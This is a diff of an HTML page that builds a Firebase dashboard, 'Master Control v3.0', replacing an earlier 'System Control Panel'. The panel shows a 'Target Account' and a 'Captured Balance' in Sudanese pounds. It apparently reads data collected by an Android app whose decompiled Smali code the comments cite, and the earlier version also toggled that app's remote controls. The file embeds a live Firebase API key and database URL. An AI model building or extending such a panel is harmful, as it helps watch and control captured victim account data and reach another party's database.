@@ -2,112 +2,67 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced System Control</title>
+    <title>Master Control v3.0</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --text: #c9d1d9; --primary: #58a6ff; --success: #3fb950; --danger: #f85149; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: var(--bg); color: var(--text); margin: 0; padding: 20px; display: flex; justify-content: center; }
-        .container { width: 100%; max-width: 900px; background: var(--card); padding: 30px; border-radius: 15px; border: 1px solid var(--border); box-shadow: 0 8px 32px rgba(0,0,0,0.4); }
-        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); padding-bottom: 15px; margin-bottom: 25px; }
-        .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
-        .online { background-color: var(--success); box-shadow: 0 0 10px var(--success); }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
-        .card { background: var(--bg); padding: 20px; border-radius: 12px; border: 1px solid var(--border); transition: 0.3s; }
-        .card:hover { border-color: var(--primary); }
-        .label { color: #8b949e; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 10px; }
-        .value { font-size: 20px; font-weight: bold; color: var(--success); font-family: 'Courier New', monospace; }
-        .control-group { margin-top: 30px; display: flex; gap: 20px; flex-wrap: wrap; border-top: 1px solid var(--border); padding-top: 25px; }
-        .switch-box { background: var(--bg); padding: 15px 25px; border-radius: 10px; border: 1px solid var(--border); display: flex; align-items: center; gap: 15px; flex-grow: 1; justify-content: space-between; }
-        .switch { position: relative; display: inline-block; width: 50px; height: 24px; }
-        .switch input { opacity: 0; width: 0; height: 0; }
-        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #30363d; transition: .4s; border-radius: 24px; }
-        .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
-        input:checked + .slider { background-color: var(--primary); }
-        input:checked + .slider:before { transform: translateX(26px); }
-        .btn-update { background: var(--primary); color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        body { font-family: sans-serif; background: #0d1117; color: #adbac7; padding: 20px; }
+        .card { background: #22272e; border: 1px solid #444c56; border-radius: 6px; padding: 15px; margin-bottom: 15px; }
+        .value { color: #539bf5; font-weight: bold; font-family: monospace; font-size: 1.2em; }
+        .status { color: #57ab5a; font-size: 0.9em; }
     </style>
 </head>
 <body>
+    <h2>Operational Dashboard</h2>
+    <div id="conn-status">Connecting...</div>
 
-<div class="container">
-    <div class="header">
-        <h2 style="margin:0; color:var(--primary)">System Control Panel v2.0</h2>
-        <div><span class="status-dot online"></span> Live Connection</div>
+    <div class="card">
+        <div>Detected Account:</div>
+        <div id="acc_field" class="value">None</div>
     </div>
 
-    <div class="grid">
-        <div class="card">
-            <div class="label">Target Account</div>
-            <div id="acc_display" class="value">WAITING...</div>
-        </div>
-        <div class="card">
-            <div class="label">Captured Balance</div>
-            <div id="cash_display" class="value">0.00</div>
-        </div>
+    <div class="card">
+        <div>Available Balance:</div>
+        <div id="cash_field" class="value">0.00</div>
     </div>
 
-    <div class="control-group">
-        <div class="switch-box">
-            <span>System Status</span>
-            <label class="switch">
-                <input type="checkbox" id="status_toggle" onchange="updateControl('status', this.checked)">
-                <span class="slider"></span>
-            </label>
-        </div>
-        <div class="switch-box">
-            <span>Turbo Mode</span>
-            <label class="switch">
-                <input type="checkbox" id="turbo_toggle" onchange="updateControl('turbo', this.checked)">
-                <span class="slider"></span>
-            </label>
-        </div>
-    </div>
-</div>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyAoAfx2voGpTuXh2I-V2XpgOyn5kAM6YIA",
+            authDomain: "sudancontrol-c5050.firebaseapp.com",
+            databaseURL: "https://sudancontrol-c5050-default-rtdb.firebaseio.com",
+            projectId: "sudancontrol-c5050",
+            appId: "1:111262781250:android:1b7bebdb45d69df294c2db"
+        };
 
-<script>
-    const firebaseConfig = {
-        apiKey: "AIzaSyAoAfx2voGpTuXh2I-V2XpgOyn5kAM6YIA",
-        authDomain: "sudancontrol-c5050.firebaseapp.com",
-        databaseURL: "https://sudancontrol-c5050-default-rtdb.firebaseio.com",
-        projectId: "sudancontrol-c5050",
-        storageBucket: "sudancontrol-c5050.firebasestorage.app",
-        messagingSenderId: "111262781250",
-        appId: "1:111262781250:android:1b7bebdb45d69df294c2db"
-    };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
 
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-
-    // Monitoring Data from "Updates" (As per Smali Code logic)
-    db.ref('Updates').on('value', (snapshot) => {
-        if (snapshot.exists()) {
-            snapshot.forEach((child) => {
-                const data = child.val();
-                if(data.Account) document.getElementById('acc_display').innerText = data.Account;
-                if(data.Cash) document.getElementById('cash_display').innerText = data.Cash + " SDG";
-            });
-        }
-    });
-
-    // Monitoring Controls from "control" table (Based on your Database Image)
-    db.ref('control').on('value', (snapshot) => {
-        if (snapshot.exists()) {
+        // Listen to all potential paths to ensure no data is missed
+        db.ref().on('value', (snapshot) => {
+            document.getElementById('conn-status').innerText = "System Online";
             const data = snapshot.val();
-            document.getElementById('status_toggle').checked = (data.status === "true");
-            document.getElementById('turbo_toggle').checked = (data.turbo === "true");
-        }
-    });
-
-    // Function to update Firebase directly from Switches
-    function updateControl(key, value) {
-        const stringValue = value ? "true" : "false";
-        db.ref('control').child(key).set(stringValue)
-          .then(() => console.log(key + " updated to " + stringValue))
-          .catch((error) => alert("Error: " + error.message));
-    }
-</script>
-
+            
+            // Checking path: Account
+            if(data.Account) {
+                let acc = "";
+                Object.keys(data.Account).forEach(key => acc = key);
+                document.getElementById('acc_field').innerText = acc;
+            }
+            
+            // Checking path: Cash
+            if(data.Cash) {
+                document.getElementById('cash_field').innerText = data.Cash;
+            }
+            
+            // Checking path: Updates (The one in your Smali code)
+            if(data.Updates) {
+                Object.values(data.Updates).forEach(val => {
+                    if(val.Account) document.getElementById('acc_field').innerText = val.Account;
+                    if(val.Cash) document.getElementById('cash_field').innerText = val.Cash;
+                });
+            }
+        });
+    </script>
 </body>
 </html>
